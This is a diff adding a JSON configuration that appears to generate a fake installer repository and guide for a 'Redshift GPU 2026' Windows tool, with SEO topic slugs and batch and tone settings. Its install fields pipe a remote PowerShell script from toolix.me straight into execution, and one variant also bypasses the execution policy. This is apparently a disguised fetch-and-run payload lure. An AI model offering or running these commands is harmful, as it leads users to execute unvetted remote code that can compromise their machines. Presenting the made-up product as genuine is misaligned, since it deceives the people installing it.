@@ -1,0 +1,29 @@
+{
+  "repo": "Redshift-GPU-2026-Windows-Setup",
+  "product": "Redshift GPU 2026 Windows Setup",
+  "product_title": "Redshift GPU 2026 Windows",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "video-editing",
+  "topics": [
+    "how-to-install-redshift-gpu-windows",
+    "redshift-gpu-windows-app",
+    "screen-capture",
+    "directx-capture",
+    "video-export",
+    "media-capture",
+    "creator-workflow",
+    "windows-recording",
+    "redshift-gpu-windows-desktop-tool",
+    "redshift-gpu-windows-windows-tool",
+    "redshift-gpu-windows-desktop-2026",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
